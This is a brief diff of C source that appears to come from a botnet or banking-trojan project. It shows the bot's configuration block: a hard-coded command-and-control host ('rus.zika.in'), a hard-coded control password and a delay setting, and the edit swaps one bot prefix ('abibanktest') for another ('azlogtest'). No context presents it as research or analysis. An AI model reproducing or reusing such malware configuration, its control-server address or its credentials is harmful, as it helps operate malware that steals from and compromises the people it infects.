@@ -93,7 +93,7 @@ char BOT_VERSION_BUF[] = BOT_VERSION_HEADER    BOT_VERSION;
 
 	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = "rus.zika.in\0";
 	char MainPassword[MAX_PASSWORD_SIZE + 1] = "bRS8yYQ0APq9xfzC";
-	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = "abibanktest";
+	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = "azlogtest";
 	char Delay[MAX_DELAY_SIZE + 1]       = "1";
 
 
